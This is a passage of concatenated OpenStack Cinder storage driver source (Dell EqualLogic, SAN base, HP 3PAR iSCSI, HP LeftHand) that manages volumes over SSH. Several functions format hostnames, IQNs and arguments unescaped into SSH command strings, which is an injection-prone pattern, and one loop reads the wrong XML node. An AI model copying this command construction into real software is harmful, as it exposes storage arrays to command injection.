                                         min_size=min_size,
                                         max_size=max_size)
        try:
            total_attempts = attempts
            with self.sshpool.item() as ssh:
                while attempts > 0:
                    attempts -= 1
                    try:
                        LOG.info(_('EQL-driver: executing "%s"') % command)
                        return self._ssh_execute(
                            ssh, command,
                            timeout=self.configuration.eqlx_cli_timeout)
                    except processutils.ProcessExecutionError:
                        raise
                    except Exception as e:
                        LOG.exception(e)
                        greenthread.sleep(random.randint(20, 500) / 100.0)
                msg = (_("SSH Command failed after '%(total_attempts)r' "
                         "attempts : '%(command)s'") %
                       {'total_attempts': total_attempts, 'command': command})
                raise exception.VolumeBackendAPIException(data=msg)

        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_("Error running SSH command: %s") % command)

    def _eql_execute(self, *args, **kwargs):
        return self._run_ssh(
            args, attempts=self.configuration.eqlx_cli_max_retries)

    def _get_volume_data(self, lines):
        prefix = 'iSCSI target name is '
        target_name = self._get_prefixed_value(lines, prefix)[:-1]
        lun_id = "%s:%s,1 %s 0" % (self._group_ip, '3260', target_name)
        model_update = {}
        model_update['provider_location'] = lun_id
        if self.configuration.eqlx_use_chap:
            model_update['provider_auth'] = 'CHAP %s %s' % \
                (self.configuration.eqlx_chap_login,
                 self.configuration.eqlx_chap_password)
        return model_update

    def _get_space_in_gb(self, val):
        scale = 1.0
        part = 'GB'
        if val.endswith('MB'):
            scale = 1.0 / 1024
            part = 'MB'
        elif val.endswith('TB'):
            scale = 1.0 * 1024
            part = 'TB'
        return scale * float(val.partition(part)[0])

    def _update_volume_stats(self):
        """Retrieve stats info from eqlx group."""

        LOG.debug(_("Updating volume stats"))
        data = {}
        backend_name = "eqlx"
        if self.configuration:
            backend_name = self.configuration.safe_get('volume_backend_name')
        data["volume_backend_name"] = backend_name or 'eqlx'
        data["vendor_name"] = 'Dell'
        data["driver_version"] = self.VERSION
        data["storage_protocol"] = 'iSCSI'

        data['reserved_percentage'] = 0
        data['QoS_support'] = False

        data['total_capacity_gb'] = 'infinite'
        data['free_capacity_gb'] = 'infinite'

        for line in self._eql_execute('pool', 'select',
                                      self.configuration.eqlx_pool, 'show'):
            if line.startswith('TotalCapacity:'):
                out_tup = line.rstrip().partition(' ')
                data['total_capacity_gb'] = self._get_space_in_gb(out_tup[-1])
            if line.startswith('FreeSpace:'):
                out_tup = line.rstrip().partition(' ')
                data['free_capacity_gb'] = self._get_space_in_gb(out_tup[-1])

        self._stats = data

    def _check_volume(self, volume):
        """Check if the volume exists on the Array."""
        command = ['volume', 'select', volume['name'], 'show']
        try:
            self._eql_execute(*command)
        except processutils.ProcessExecutionError as err:
            with excutils.save_and_reraise_exception():
                if err.stdout.find('does not exist.\n') > -1:
                    LOG.debug(_('Volume %s does not exist, '
                                'it may have already been deleted'),
                              volume['name'])
                    raise exception.VolumeNotFound(volume_id=volume['id'])

    def do_setup(self, context):
        """Disable cli confirmation and tune output format."""
        try:
            disabled_cli_features = ('confirmation', 'paging', 'events',
                                     'formatoutput')
            for feature in disabled_cli_features:
                self._eql_execute('cli-settings', feature, 'off')

            for line in self._eql_execute('grpparams', 'show'):
                if line.startswith('Group-Ipaddress:'):
                    out_tup = line.rstrip().partition(' ')
                    self._group_ip = out_tup[-1]

            LOG.info(_("EQL-driver: Setup is complete, group IP is %s"),
                     self._group_ip)
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to setup the Dell EqualLogic driver'))

    def create_volume(self, volume):
        """Create a volume."""
        try:
            cmd = ['volume', 'create',
                   volume['name'], "%sG" % (volume['size'])]
            if self.configuration.eqlx_pool != 'default':
                cmd.append('pool')
                cmd.append(self.configuration.eqlx_pool)
            if self.configuration.san_thin_provision:
                cmd.append('thin-provision')
            out = self._eql_execute(*cmd)
            return self._get_volume_data(out)
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to create volume %s'), volume['name'])

    def delete_volume(self, volume):
        """Delete a volume."""
        try:
            self._check_volume(volume)
            self._eql_execute('volume', 'select', volume['name'], 'offline')
            self._eql_execute('volume', 'delete', volume['name'])
        except exception.VolumeNotFound:
            LOG.warn(_('Volume %s was not found while trying to delete it'),
                     volume['name'])
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to delete volume %s'), volume['name'])

    def create_snapshot(self, snapshot):
        """"Create snapshot of existing volume on appliance."""
        try:
            out = self._eql_execute('volume', 'select',
                                    snapshot['volume_name'],
                                    'snapshot', 'create-now')
            prefix = 'Snapshot name is '
            snap_name = self._get_prefixed_value(out, prefix)
            self._eql_execute('volume', 'select', snapshot['volume_name'],
                              'snapshot', 'rename', snap_name,
                              snapshot['name'])
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to create snapshot of volume %s'),
                          snapshot['volume_name'])

    def create_volume_from_snapshot(self, volume, snapshot):
        """Create new volume from other volume's snapshot on appliance."""
        try:
            out = self._eql_execute('volume', 'select',
                                    snapshot['volume_name'], 'snapshot',
                                    'select', snapshot['name'],
                                    'clone', volume['name'])
            return self._get_volume_data(out)
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to create volume from snapshot %s'),
                          snapshot['name'])

    def create_cloned_volume(self, volume, src_vref):
        """Creates a clone of the specified volume."""
        try:
            src_volume_name = self.configuration.\
                volume_name_template % src_vref['id']
            out = self._eql_execute('volume', 'select', src_volume_name,
                                    'clone', volume['name'])
            return self._get_volume_data(out)
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to create clone of volume %s'),
                          volume['name'])

    def delete_snapshot(self, snapshot):
        """Delete volume's snapshot."""
        try:
            self._eql_execute('volume', 'select', snapshot['volume_name'],
                              'snapshot', 'delete', snapshot['name'])
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to delete snapshot %(snap)s of '
                            'volume %(vol)s'),
                          {'snap': snapshot['name'],
                           'vol': snapshot['volume_name']})

    def initialize_connection(self, volume, connector):
        """Restrict access to a volume."""
        try:
            cmd = ['volume', 'select', volume['name'], 'access', 'create',
                   'initiator', connector['initiator']]
            if self.configuration.eqlx_use_chap:
                cmd.extend(['authmethod chap', 'username',                    
                            self.configuration.eqlx_chap_login])
            self._eql_execute(*cmd)
            iscsi_properties = self._get_iscsi_properties(volume)
            return {
                'driver_volume_type': 'iscsi',
                'data': iscsi_properties
            }
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to initialize connection to volume %s'),
                          volume['name'])

    def terminate_connection(self, volume, connector, force=False, **kwargs):
        """Remove access restrictions from a volume."""
        try:
            self._eql_execute('volume', 'select', volume['name'],
                              'access', 'delete', '1')
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to terminate connection to volume %s'),
                          volume['name'])

    def create_export(self, context, volume):
        """Create an export of a volume.

        Driver has nothing to do here for the volume has been exported
        already by the SAN, right after it's creation.
        """
        pass

    def ensure_export(self, context, volume):
        """Ensure an export of a volume.

        Driver has nothing to do here for the volume has been exported
        already by the SAN, right after it's creation. We will just make
        sure that the volume exists on the array and issue a warning.
        """
        try:
            self._check_volume(volume)
        except exception.VolumeNotFound:
            LOG.warn(_('Volume %s is not found!, it may have been deleted'),
                     volume['name'])
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to ensure export of volume %s'),
                          volume['name'])

    def remove_export(self, context, volume):
        """Remove an export of a volume.

        Driver has nothing to do here for the volume has been exported
        already by the SAN, right after it's creation.
        Nothing to remove since there's nothing exported.
        """
        pass

    def extend_volume(self, volume, new_size):
        """Extend the size of the volume."""
        try:
            self._eql_execute('volume', 'select', volume['name'],
                              'size', "%sG" % new_size)
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to extend_volume %(name)s from '
                            '%(current_size)sGB to %(new_size)sGB'),
                          {'name': volume['name'],
                           'current_size': volume['size'],
                           'new_size': new_size})

    def local_path(self, volume):
        raise NotImplementedError()

# vim: tabstop=4 shiftwidth=4 softtabstop=4

# Copyright 2011 Justin Santa Barbara
# All Rights Reserved.
#
#    Licensed under the Apache License, Version 2.0 (the "License"); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
"""
Default Driver for san-stored volumes.

The unique thing about a SAN is that we don't expect that we can run the volume
controller on the SAN hardware.  We expect to access it over SSH or some API.
"""

import random

from eventlet import greenthread
from oslo.config import cfg

from cinder import exception
from cinder.openstack.common import excutils
from cinder.openstack.common import log as logging
from cinder import utils
from cinder.volume import driver

LOG = logging.getLogger(__name__)

san_opts = [
    cfg.BoolOpt('san_thin_provision',
                default=True,
                help='Use thin provisioning for SAN volumes?'),
    cfg.StrOpt('san_ip',
               default='',
               help='IP address of SAN controller'),
    cfg.StrOpt('san_login',
               default='admin',
               help='Username for SAN controller'),
    cfg.StrOpt('san_password',
               default='',
               help='Password for SAN controller',
               secret=True),
    cfg.StrOpt('san_private_key',
               default='',
               help='Filename of private key to use for SSH authentication'),
    cfg.StrOpt('san_clustername',
               default='',
               help='Cluster name to use for creating volumes'),
    cfg.IntOpt('san_ssh_port',
               default=22,
               help='SSH port to use with SAN'),
    cfg.BoolOpt('san_is_local',
                default=False,
                help='Execute commands locally instead of over SSH; '
                     'use if the volume service is running on the SAN device'),
    cfg.IntOpt('ssh_conn_timeout',
               default=30,
               help="SSH connection timeout in seconds"),
    cfg.IntOpt('ssh_min_pool_conn',
               default=1,
               help='Minimum ssh connections in the pool'),
    cfg.IntOpt('ssh_max_pool_conn',
               default=5,
               help='Maximum ssh connections in the pool'),
]

CONF = cfg.CONF
CONF.register_opts(san_opts)


class SanDriver(driver.VolumeDriver):
    """Base class for SAN-style storage volumes

    A SAN-style storage value is 'different' because the volume controller
    probably won't run on it, so we need to access is over SSH or another
    remote protocol.
    """

    def __init__(self, *args, **kwargs):
        execute = kwargs.pop('execute', self.san_execute)
        super(SanDriver, self).__init__(execute=execute,
                                        *args, **kwargs)
        self.configuration.append_config_values(san_opts)
        self.run_local = self.configuration.san_is_local
        self.sshpool = None

    def san_execute(self, *cmd, **kwargs):
        if self.run_local:
            return utils.execute(*cmd, **kwargs)
        else:
            check_exit_code = kwargs.pop('check_exit_code', None)
            command = ' '.join(cmd)
            return self._run_ssh(command, check_exit_code)

    def _run_ssh(self, command, check_exit_code=True, attempts=1):                    
        if not self.sshpool:
            password = self.configuration.san_password
            privatekey = self.configuration.san_private_key
            min_size = self.configuration.ssh_min_pool_conn
            max_size = self.configuration.ssh_max_pool_conn
            self.sshpool = utils.SSHPool(self.configuration.san_ip,
                                         self.configuration.san_ssh_port,
                                         self.configuration.ssh_conn_timeout,
                                         self.configuration.san_login,
                                         password=password,
                                         privatekey=privatekey,
                                         min_size=min_size,
                                         max_size=max_size)
        last_exception = None
        try:
            total_attempts = attempts
            with self.sshpool.item() as ssh:
                while attempts > 0:
                    attempts -= 1
                    try:
                        return utils.ssh_execute(
                            ssh,
                            command,
                            check_exit_code=check_exit_code)
                    except Exception as e:
                        LOG.error(e)
                        last_exception = e
                        greenthread.sleep(random.randint(20, 500) / 100.0)
                try:
                    raise exception.ProcessExecutionError(
                        exit_code=last_exception.exit_code,
                        stdout=last_exception.stdout,
                        stderr=last_exception.stderr,
                        cmd=last_exception.cmd)
                except AttributeError:
                    raise exception.ProcessExecutionError(
                        exit_code=-1,
                        stdout="",
                        stderr="Error running SSH command",
                        cmd=command)

        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_("Error running SSH command: %s") % command)

    def ensure_export(self, context, volume):
        """Synchronously recreates an export for a logical volume."""
        pass

    def create_export(self, context, volume):
        """Exports the volume."""
        pass

    def remove_export(self, context, volume):
        """Removes an export for a logical volume."""
        pass

    def check_for_setup_error(self):
        """Returns an error if prerequisites aren't met."""
        if not self.run_local:
            if not (self.configuration.san_password or
                    self.configuration.san_private_key):
                raise exception.InvalidInput(
                    reason=_('Specify san_password or san_private_key'))

        # The san_ip must always be set, because we use it for the target
        if not self.configuration.san_ip:
            raise exception.InvalidInput(reason=_("san_ip must be set"))


class SanISCSIDriver(SanDriver, driver.ISCSIDriver):
    def __init__(self, *args, **kwargs):
        super(SanISCSIDriver, self).__init__(*args, **kwargs)

    def _build_iscsi_target_name(self, volume):
        return "%s%s" % (self.configuration.iscsi_target_prefix,
                         volume['name'])


# vim: tabstop=4 shiftwidth=4 softtabstop=4
#
#    (c) Copyright 2012-2013 Hewlett-Packard Development Company, L.P.
#    All Rights Reserved.
#
#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the "License"); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
"""
Volume driver for HP 3PAR Storage array.
This driver requires 3.1.2 MU2 firmware on the 3PAR array.

You will need to install the python hp3parclient.
sudo pip install hp3parclient

Set the following in the cinder.conf file to enable the
3PAR iSCSI Driver along with the required flags:

volume_driver=cinder.volume.drivers.san.hp.hp_3par_iscsi.HP3PARISCSIDriver
"""

import sys

from hp3parclient import exceptions as hpexceptions

from cinder import exception
from cinder.openstack.common import log as logging
from cinder import utils
import cinder.volume.driver
from cinder.volume.drivers.san.hp import hp_3par_common as hpcommon
from cinder.volume.drivers.san import san

VERSION = 1.1
LOG = logging.getLogger(__name__)
DEFAULT_ISCSI_PORT = 3260


class HP3PARISCSIDriver(cinder.volume.driver.ISCSIDriver):
    """OpenStack iSCSI driver to enable 3PAR storage array.

    Version history:
        1.0 - Initial driver
        1.1 - QoS, extend volume, multiple iscsi ports, remove domain,
              session changes, faster clone, requires 3.1.2 MU2 firmware.

    """
    def __init__(self, *args, **kwargs):
        super(HP3PARISCSIDriver, self).__init__(*args, **kwargs)
        self.common = None
        self.configuration.append_config_values(hpcommon.hp3par_opts)
        self.configuration.append_config_values(san.san_opts)

    def _init_common(self):
        return hpcommon.HP3PARCommon(self.configuration)

    def _check_flags(self):
        """Sanity check to ensure we have required options set."""
        required_flags = ['hp3par_api_url', 'hp3par_username',
                          'hp3par_password', 'san_ip', 'san_login',
                          'san_password']
        self.common.check_flags(self.configuration, required_flags)

    @utils.synchronized('3par', external=True)
    def get_volume_stats(self, refresh):
        self.common.client_login()
        stats = self.common.get_volume_stats(refresh)
        stats['storage_protocol'] = 'iSCSI'
        backend_name = self.configuration.safe_get('volume_backend_name')
        stats['volume_backend_name'] = backend_name or self.__class__.__name__
        self.common.client_logout()
        return stats

    def do_setup(self, context):
        self.common = self._init_common()
        self._check_flags()

        # map iscsi_ip-> ip_port
        #             -> iqn
        #             -> nsp
        self.iscsi_ips = {}
        temp_iscsi_ip = {}

        # use the 3PAR ip_addr list for iSCSI configuration
        if len(self.configuration.hp3par_iscsi_ips) > 0:
            # add port values to ip_addr, if necessary
            for ip_addr in self.configuration.hp3par_iscsi_ips:
                ip = ip_addr.split(':')
                if len(ip) == 1:
                    temp_iscsi_ip[ip_addr] = {'ip_port': DEFAULT_ISCSI_PORT}
                elif len(ip) == 2:
                    temp_iscsi_ip[ip[0]] = {'ip_port': ip[1]}
                else:
                    msg = _("Invalid IP address format '%s'") % ip_addr
                    LOG.warn(msg)

        # add the single value iscsi_ip_address option to the IP dictionary.
        # This way we can see if it's a valid iSCSI IP. If it's not valid,
        # we won't use it and won't bother to report it, see below
        if (self.configuration.iscsi_ip_address not in temp_iscsi_ip):
            ip = self.configuration.iscsi_ip_address
            ip_port = self.configuration.iscsi_port
            temp_iscsi_ip[ip] = {'ip_port': ip_port}

        # get all the valid iSCSI ports from 3PAR
        # when found, add the valid iSCSI ip, ip port, iqn and nsp
        # to the iSCSI IP dictionary
        # ...this will also make sure ssh works.
        iscsi_ports = self.common.get_ports()['iSCSI']
        for (ip, iscsi_info) in iscsi_ports.iteritems():
            if ip in temp_iscsi_ip:
                ip_port = temp_iscsi_ip[ip]['ip_port']
                self.iscsi_ips[ip] = {'ip_port': ip_port,
                                      'nsp': iscsi_info['nsp'],
                                      'iqn': iscsi_info['iqn']
                                      }
                del temp_iscsi_ip[ip]

        # if the single value iscsi_ip_address option is still in the
        # temp dictionary it's because it defaults to $my_ip which doesn't
        # make sense in this context. So, if present, remove it and move on.
        if (self.configuration.iscsi_ip_address in temp_iscsi_ip):
            del temp_iscsi_ip[self.configuration.iscsi_ip_address]

        # lets see if there are invalid iSCSI IPs left in the temp dict
        if len(temp_iscsi_ip) > 0:
            msg = _("Found invalid iSCSI IP address(s) in configuration "
                    "option(s) hp3par_iscsi_ips or iscsi_ip_address '%s.'") % \
                   (", ".join(temp_iscsi_ip))
            LOG.warn(msg)

        if not len(self.iscsi_ips) > 0:
            msg = _('At least one valid iSCSI IP address must be set.')
            raise exception.InvalidInput(reason=(msg))

        self.common.do_setup(context)

    def check_for_setup_error(self):
        """Returns an error if prerequisites aren't met."""
        self._check_flags()

    @utils.synchronized('3par', external=True)
    def create_volume(self, volume):
        self.common.client_login()
        metadata = self.common.create_volume(volume)
        self.common.client_logout()

        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_cloned_volume(self, volume, src_vref):
        """Clone an existing volume."""
        self.common.client_login()
        new_vol = self.common.create_cloned_volume(volume, src_vref)
        self.common.client_logout()

        return {'metadata': new_vol}

    @utils.synchronized('3par', external=True)
    def delete_volume(self, volume):
        self.common.client_login()
        self.common.delete_volume(volume)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def create_volume_from_snapshot(self, volume, snapshot):
        """
        Creates a volume from a snapshot.

        TODO: support using the size from the user.
        """
        self.common.client_login()
        metadata = self.common.create_volume_from_snapshot(volume, snapshot)
        self.common.client_logout()
        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_snapshot(self, snapshot):
        self.common.client_login()
        self.common.create_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def delete_snapshot(self, snapshot):
        self.common.client_login()
        self.common.delete_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def initialize_connection(self, volume, connector):
        """Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host.

        This driver returns a driver_volume_type of 'iscsi'.
        The format of the driver data is defined in _get_iscsi_properties.
        Example return value:

            {
                'driver_volume_type': 'iscsi'
                'data': {
                    'target_discovered': True,
                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',
                    'target_protal': '127.0.0.1:3260',
                    'volume_id': 1,
                }
            }

        Steps to export a volume on 3PAR
          * Get the 3PAR iSCSI iqn
          * Create a host on the 3par
          * create vlun on the 3par
        """
        self.common.client_login()

        # we have to make sure we have a host
        host = self._create_host(volume, connector)

        # now that we have a host, create the VLUN
        vlun = self.common.create_vlun(volume, host)

        self.common.client_logout()

        iscsi_ip = self._get_iscsi_ip(host['name'])
        iscsi_ip_port = self.iscsi_ips[iscsi_ip]['ip_port']
        iscsi_target_iqn = self.iscsi_ips[iscsi_ip]['iqn']
        info = {'driver_volume_type': 'iscsi',
                'data': {'target_portal': "%s:%s" %
                         (iscsi_ip, iscsi_ip_port),
                         'target_iqn': iscsi_target_iqn,
                         'target_lun': vlun['lun'],
                         'target_discovered': True
                         }
                }
        return info

    @utils.synchronized('3par', external=True)
    def terminate_connection(self, volume, connector, **kwargs):
        """Driver entry point to unattach a volume from an instance."""
        self.common.client_login()
        self.common.terminate_connection(volume,
                                         connector['host'],
                                         connector['initiator'])
        self.common.client_logout()

    def _create_3par_iscsi_host(self, hostname, iscsi_iqn, domain, persona_id):
        """Create a 3PAR host.

        Create a 3PAR host, if there is already a host on the 3par using
        the same iqn but with a different hostname, return the hostname
        used by 3PAR.
        """
        cmd = 'createhost -iscsi -persona %s -domain %s %s %s' % \                    
              (persona_id, domain, hostname, iscsi_iqn)                    
        out = self.common._cli_run(cmd, None)                    
        if out and len(out) > 1:
            return self.common.parse_create_host_error(hostname, out)
        return hostname

    def _modify_3par_iscsi_host(self, hostname, iscsi_iqn):
        # when using -add, you can not send the persona or domain options
        self.common._cli_run('createhost -iscsi -add %s %s'                    
                             % (hostname, iscsi_iqn), None)                    

    def _create_host(self, volume, connector):
        """Creates or modifies existing 3PAR host."""
        # make sure we don't have the host already
        host = None
        hostname = self.common._safe_hostname(connector['host'])
        cpg = self.common.get_cpg(volume, allowSnap=True)
        domain = self.common.get_domain(cpg)
        try:
            host = self.common._get_3par_host(hostname)
            if not host['iSCSIPaths']:
                self._modify_3par_iscsi_host(hostname, connector['initiator'])
                host = self.common._get_3par_host(hostname)
        except hpexceptions.HTTPNotFound:
            # get persona from the volume type extra specs
            persona_id = self.common.get_persona_type(volume)
            # host doesn't exist, we have to create it
            hostname = self._create_3par_iscsi_host(hostname,
                                                    connector['initiator'],
                                                    domain,
                                                    persona_id)
            host = self.common._get_3par_host(hostname)

        return host

    @utils.synchronized('3par', external=True)
    def create_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def ensure_export(self, context, volume):
        pass

    @utils.synchronized('3par', external=True)
    def remove_export(self, context, volume):
        pass

    def _get_iscsi_ip(self, hostname):
        """Get an iSCSI IP address to use.

        Steps to determine which IP address to use.
          * If only one IP address, return it
          * If there is an active vlun, return the IP associated with it
          * Return IP with fewest active vluns
        """
        if len(self.iscsi_ips) == 1:
            return self.iscsi_ips.keys()[0]

        # if we currently have an active port, use it
        nsp = self._get_active_nsp(hostname)

        if nsp is None:
            # no active vlun, find least busy port
            nsp = self._get_least_used_nsp(self._get_iscsi_nsps())
            if nsp is None:
                msg = _("Least busy iSCSI port not found, "
                        "using first iSCSI port in list.")
                LOG.warn(msg)
                return self.iscsi_ips.keys()[0]

        return self._get_ip_using_nsp(nsp)

    def _get_iscsi_nsps(self):
        """Return the list of candidate nsps."""
        nsps = []
        for value in self.iscsi_ips.values():
            nsps.append(value['nsp'])
        return nsps

    def _get_ip_using_nsp(self, nsp):
        """Return IP assiciated with given nsp."""
        for (key, value) in self.iscsi_ips.items():
            if value['nsp'] == nsp:
                return key

    def _get_active_nsp(self, hostname):
        """Return the active nsp, if one exists, for the given host."""
        result = self.common._cli_run('showvlun -a -host %s' % hostname, None)                    
        if result:
            # first line is header
            result = result[1:]
            for line in result:
                info = line.split(",")
                if info and len(info) > 4:
                    return info[4]

    def _get_least_used_nsp(self, nspss):
        """"Return the nsp that has the fewest active vluns."""
        # return only the nsp (node:server:port)
        result = self.common._cli_run('showvlun -a -showcols Port', None)                    

        # count the number of nsps (there is 1 for each active vlun)
        nsp_counts = {}
        for nsp in nspss:
            # initialize counts to zero
            nsp_counts[nsp] = 0

        current_least_used_nsp = None
        if result:
            # first line is header
            result = result[1:]
            for line in result:
                nsp = line.strip()
                if nsp in nsp_counts:
                    nsp_counts[nsp] = nsp_counts[nsp] + 1

            # identify key (nsp) of least used nsp
            current_smallest_count = sys.maxint
            for (nsp, count) in nsp_counts.iteritems():
                if count < current_smallest_count:
                    current_least_used_nsp = nsp
                    current_smallest_count = count

        return current_least_used_nsp

    def extend_volume(self, volume, new_size):
        self.common.extend_volume(volume, new_size)

#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the "License"); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
"""
HP Lefthand SAN ISCSI Driver.

The driver communicates to the backend aka Cliq via SSH to perform all the
operations on the SAN.
"""
from lxml import etree

from cinder import exception
from cinder.openstack.common import log as logging
from cinder.volume.drivers.san.san import SanISCSIDriver


LOG = logging.getLogger(__name__)


class HpSanISCSIDriver(SanISCSIDriver):
    """Executes commands relating to HP/Lefthand SAN ISCSI volumes.

    We use the CLIQ interface, over SSH.

    Rough overview of CLIQ commands used:

    :createVolume:    (creates the volume)

    :getVolumeInfo:    (to discover the IQN etc)

    :getClusterInfo:    (to discover the iSCSI target IP address)

    :assignVolumeChap:    (exports it with CHAP security)

    The 'trick' here is that the HP SAN enforces security by default, so
    normally a volume mount would need both to configure the SAN in the volume
    layer and do the mount on the compute layer.  Multi-layer operations are
    not catered for at the moment in the cinder architecture, so instead we
    share the volume using CHAP at volume creation time.  Then the mount need
    only use those CHAP credentials, so can take place exclusively in the
    compute layer.
    """

    device_stats = {}

    def __init__(self, *args, **kwargs):
        super(HpSanISCSIDriver, self).__init__(*args, **kwargs)
        self.cluster_vip = None

    def _cliq_run(self, verb, cliq_args, check_exit_code=True):
        """Runs a CLIQ command over SSH, without doing any result parsing"""
        cliq_arg_strings = []                    
        for k, v in cliq_args.items():
            cliq_arg_strings.append(" %s=%s" % (k, v))                    
        cmd = verb + ''.join(cliq_arg_strings)                    

        return self._run_ssh(cmd, check_exit_code)                    

    def _cliq_run_xml(self, verb, cliq_args, check_cliq_result=True):
        """Runs a CLIQ command over SSH, parsing and checking the output"""
        cliq_args['output'] = 'XML'
        (out, _err) = self._cliq_run(verb, cliq_args, check_cliq_result)

        LOG.debug(_("CLIQ command returned %s"), out)

        result_xml = etree.fromstring(out)
        if check_cliq_result:
            response_node = result_xml.find("response")
            if response_node is None:
                msg = (_("Malformed response to CLIQ command "
                         "%(verb)s %(cliq_args)s. Result=%(out)s") %
                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})
                raise exception.VolumeBackendAPIException(data=msg)

            result_code = response_node.attrib.get("result")

            if result_code != "0":
                msg = (_("Error running CLIQ command %(verb)s %(cliq_args)s. "
                         " Result=%(out)s") %
                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})
                raise exception.VolumeBackendAPIException(data=msg)

        return result_xml

    def _cliq_get_cluster_info(self, cluster_name):
        """Queries for info about the cluster (including IP)"""
        cliq_args = {}
        cliq_args['clusterName'] = cluster_name
        cliq_args['searchDepth'] = '1'
        cliq_args['verbose'] = '0'

        result_xml = self._cliq_run_xml("getClusterInfo", cliq_args)

        return result_xml

    def _cliq_get_cluster_vip(self, cluster_name):
        """Gets the IP on which a cluster shares iSCSI volumes"""
        cluster_xml = self._cliq_get_cluster_info(cluster_name)

        vips = []
        for vip in cluster_xml.findall("response/cluster/vip"):
            vips.append(vip.attrib.get('ipAddress'))

        if len(vips) == 1:
            return vips[0]

        _xml = etree.tostring(cluster_xml)
        msg = (_("Unexpected number of virtual ips for cluster "
                 " %(cluster_name)s. Result=%(_xml)s") %
               {'cluster_name': cluster_name, '_xml': _xml})
        raise exception.VolumeBackendAPIException(data=msg)

    def _cliq_get_volume_info(self, volume_name):
        """Gets the volume info, including IQN"""
        cliq_args = {}
        cliq_args['volumeName'] = volume_name
        result_xml = self._cliq_run_xml("getVolumeInfo", cliq_args)

        # Result looks like this:
        #<gauche version="1.0">
        #  <response description="Operation succeeded." name="CliqSuccess"
        #            processingTime="87" result="0">
        #    <volume autogrowPages="4" availability="online" blockSize="1024"
        #       bytesWritten="0" checkSum="false" clusterName="Cluster01"
        #       created="2011-02-08T19:56:53Z" deleting="false" description=""
        #       groupName="Group01" initialQuota="536870912" isPrimary="true"
        #       iscsiIqn="iqn.2003-10.com.lefthandnetworks:group01:25366:vol-b"
        #       maxSize="6865387257856" md5="9fa5c8b2cca54b2948a63d833097e1ca"
        #       minReplication="1" name="vol-b" parity="0" replication="2"
        #       reserveQuota="536870912" scratchQuota="4194304"
        #       serialNumber="9fa5c8b2cca54b2948a63d833097e1ca0000000000006316"
        #       size="1073741824" stridePages="32" thinProvision="true">
        #      <status description="OK" value="2"/>
        #      <permission access="rw"
        #            authGroup="api-34281B815713B78-(trimmed)51ADD4B7030853AA7"
        #            chapName="chapusername" chapRequired="true" id="25369"
        #            initiatorSecret="" iqn="" iscsiEnabled="true"
        #            loadBalance="true" targetSecret="supersecret"/>
        #    </volume>
        #  </response>
        #</gauche>

        # Flatten the nodes into a dictionary; use prefixes to avoid collisions
        volume_attributes = {}

        volume_node = result_xml.find("response/volume")
        for k, v in volume_node.attrib.items():
            volume_attributes["volume." + k] = v

        status_node = volume_node.find("status")
        if status_node is not None:
            for k, v in status_node.attrib.items():
                volume_attributes["status." + k] = v

        # We only consider the first permission node
        permission_node = volume_node.find("permission")
        if permission_node is not None:
            for k, v in status_node.attrib.items():
                volume_attributes["permission." + k] = v

        LOG.debug(_("Volume info: %(volume_name)s => %(volume_attributes)s") %
                  {'volume_name': volume_name,
                   'volume_attributes': volume_attributes})
        return volume_attributes

    def create_volume(self, volume):
        """Creates a volume."""
        cliq_args = {}
        cliq_args['clusterName'] = self.configuration.san_clustername

        if self.configuration.san_thin_provision:
            cliq_args['thinProvision'] = '1'
        else:
            cliq_args['thinProvision'] = '0'

        cliq_args['volumeName'] = volume['name']
        if int(volume['size']) == 0:
            cliq_args['size'] = '100MB'
        else:
            cliq_args['size'] = '%sGB' % volume['size']

        self._cliq_run_xml("createVolume", cliq_args)

        volume_info = self._cliq_get_volume_info(volume['name'])
        cluster_name = volume_info['volume.clusterName']
        iscsi_iqn = volume_info['volume.iscsiIqn']

        #TODO(justinsb): Is this always 1? Does it matter?
        cluster_interface = '1'

        if not self.cluster_vip:
            self.cluster_vip = self._cliq_get_cluster_vip(cluster_name)
